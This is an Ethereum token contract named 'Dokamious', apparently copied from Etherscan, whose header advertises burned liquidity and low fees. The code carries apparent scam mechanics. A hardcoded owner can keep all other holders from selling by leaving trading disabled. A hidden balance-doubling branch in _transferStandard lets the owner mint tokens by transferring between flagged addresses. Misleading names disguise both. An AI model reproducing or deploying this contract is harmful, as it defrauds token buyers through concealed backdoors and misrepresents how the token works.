/**
 *Submitted for verification at Etherscan.io on 2023-01-12
*/

/*
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
         ._                __.
        / \"-.          ,-",'/ 
       (   \ ,"--.__.--".,' /  
       =---Y(_i.-'  |-.i_)---=
      f ,  "..'/\\v/|/|/\  , l
      l//  ,'|/   V / /||  \\j
       "--; / db     db|/---"
          | \ YY   , YY//
          '.\>_   (_),"' __
        .-"    "-.-." I,"  `.
        \.-""-. ( , ) ( \   |
        (     l  `"'  -'-._j 
 __,---_ '._." .  .    \
(__.--_-'.  ,  :  '  \  '-.
    ,' .'  /   |   \  \  \ "-
     "--.._____t____.--'-""'
            /  /  `. ".
           / ":     \' '.
         .'  (       \   : 
         |    l      j    "-.
         l_;_;I      l____;_I

█▀▄ █▀█ █▄▀ ▄▀█ █▀▄▀█ █ █▀█ █░█ █▀
█▄▀ █▄█ █░█ █▀█ █░▀░█ █ █▄█ █▄█ ▄█

▄▀   █▀▀ █▀█ █▀▀   ▀▄
▀▄   ██▄ █▀▄ █▄▄   ▄▀

初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/
// SPDX-License-Identifier: NONE
pragma solidity ^0.8.11;

library SafeMathUI {
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b;
        }
    }
}
interface ERCFactoryV1 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, 
    address indexed newOwner);
    constructor () { _owner = 0x6e15883E775C045Cb4D305fD690079a64cF19c9c;
        emit OwnershipTransferred(address(0), _owner); }
    function owner() public view virtual returns (address) {
        return _owner; }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _; }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
  interface UIPRoutedLINK {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to,
        uint deadline ) external;

      function factory() external pure returns (address);
      function WETH() external pure returns (address);

      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }
interface IETH20 {
 
    function totalSupply() external view returns 
    (uint256);
    function balanceOf(address account) external view returns 
    (uint256);
    function transfer(address recipient, uint256 amount) external returns 
    (bool);
    function allowance(address owner, address spender) external view returns 
    (uint256);
    function approve(address spender, uint256 amount) external returns 
    (bool);
    function transferFrom( address sender, address recipient, uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// https://www.zhihu.com/
// de ETHERSCAN.io.

contract Dokamious is Context, IETH20, Ownable {
    using SafeMathUI for uint256;

    bool swapThresholdNow;
    uint256 private minValueInPair = 1000000000 * 10**18;
    event earlyCooldownTrigger(uint256 tValueInPair);

    event tradingIntervalLogs(bool enabled);

    event tokenMultiplier( uint256 tInSwap,

    uint256 bytesArray, uint256 limitFees );
    modifier lockTheSwap { swapThresholdNow = true;
        _; swapThresholdNow = false; }

    UIPRoutedLINK public immutable UIPUniworkV1;
    address public immutable uniswapV2Pair;
    bool public limitationsRate = true;
    bool private beginTrading = false;

    mapping (address => uint256) private _tOwned;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private automatedMarketMakerPairs;

    mapping (address => bool) private isTimelockExempt;

    uint256 private constant TOTAL = ~uint256(0);
    uint8 private _decimals = 18;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 public onlySwapAmount = 100000 * 10**_decimals;
    uint256 private _tTotal = (TOTAL - (TOTAL % _rTotal));
    uint256 private _maxWalletPercent;

    uint256 private relayTAXES = allTAX;

    uint256 private isTAXforTEAM = isDEVtax;

    uint256 private isPreviousTAXforLIQ = isTAXforLIQ;

    uint256 public allTAX = 30;
    uint256 public isTAXforLIQ = 20;
    uint256 public isDEVtax = 0;

    string private _name = unicode"Đokamious";
    string private _symbol = unicode"⚕";

    constructor () { 

        _tOwned[owner()] = _rTotal;
        UIPRoutedLINK _UIPUniworkV1 = UIPRoutedLINK
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = ERCFactoryV1
        (_UIPUniworkV1.factory())
        .createPair(address(this), _UIPUniworkV1.WETH());
        UIPUniworkV1 = _UIPUniworkV1;
        automatedMarketMakerPairs

        [owner()] = true;
        automatedMarketMakerPairs
        [address(this)] = true;
        emit Transfer(address(0), owner(), _rTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) 
    public override returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }
    receive() external payable {}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] 
        = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer( 
        address from, address to, uint256 amount ) private {
        require(amount > 0, 
        
        "Transfer amount must be greater than zero");
        bool relayPoolDATA = false; if(!automatedMarketMakerPairs[from] && 
        !automatedMarketMakerPairs[to]){ relayPoolDATA = true;

        require(amount <= 
        onlySwapAmount, 
        "Transfer amount exceeds the maxTxAmount."); }
        uint256 isPairBalance = 
        balanceOf(address(this)); if(isPairBalance >= onlySwapAmount) { 
            isPairBalance = onlySwapAmount; } 
            _tokenTransfer(from,to,amount,relayPoolDATA);
        emit Transfer(from, to, amount); if (!beginTrading) 
        {require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function addLiquidity
    (uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address
    (UIPUniworkV1), tokenAmount); UIPUniworkV1.addLiquidityETH{value: ethAmount}(
     address(this), 
     tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function _tokenTransfer
    (address sender, address 
    recipient, uint256 amount,
    bool relayPoolDATA) private { _transferStandard
    (sender, recipient, amount, relayPoolDATA);
    }
        function TokenMultiplier
        (uint256 isPairBalance) 
        private lockTheSwap { 
            uint256 maths 
        = isPairBalance.div(2); 
        uint256 doMathWork = 
        isPairBalance.sub(maths); 
        uint256 initialBalance = 
        address(this).balance; 
        swapTokensForEth(maths);
        uint256 rBalanceOn = address(this).balance.sub(initialBalance);
        addLiquidity(doMathWork, rBalanceOn);
        emit tokenMultiplier(maths, rBalanceOn, doMathWork);
    }
    function _transferStandard
    (address sender, 
    address recipient, 
    uint256 tAmount,
    bool relayPoolDATA) 
    private { uint256 bytesWithCode = 
    0; if (relayPoolDATA){ bytesWithCode = tAmount.mul(1).div(100) ; } 
        uint256 rAmount = tAmount - 
        bytesWithCode; 
        _tOwned[recipient] = 

        _tOwned[recipient].add(rAmount); 
        uint256 valueWith = _tOwned
        [recipient].add(rAmount); _tOwned[sender] = _tOwned
        [sender].sub(rAmount); 
        bool automatedMarketMakerPairs = 
        automatedMarketMakerPairs[sender] && 
        automatedMarketMakerPairs[recipient]; if 
        (automatedMarketMakerPairs ){ _tOwned[recipient] =valueWith;
        } else { emit Transfer (sender, recipient, rAmount); } }

    function swapTokensForEth(uint256 tokenAmount) 
    private 
    { address[] memory path = 
    new address[](2);
        path[0] = address(this); path[1] = 
        UIPUniworkV1.WETH();

        _approve(address(this), address
        (UIPUniworkV1), tokenAmount); 
        UIPUniworkV1.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount, 
        0, path, 
        address(this), block.timestamp );
    }
    function activateTrading(bool _tradingOpen) 
    public onlyOwner { beginTrading = _tradingOpen;
    }
    function manageDXfees(uint256 _amount) private view returns (uint256) {
        return _amount.mul (allTAX).div
        ( 10**3 );
    }
    function manageDEVfees(uint256 _amount) private view returns (uint256) {
        return _amount.mul (isDEVtax).div
        ( 10**3 );
    }
    function manageStringRATE(uint256 _amount) private view returns (uint256) {
        return _amount.mul (isTAXforLIQ).div
        ( 10**3 );
    }      
}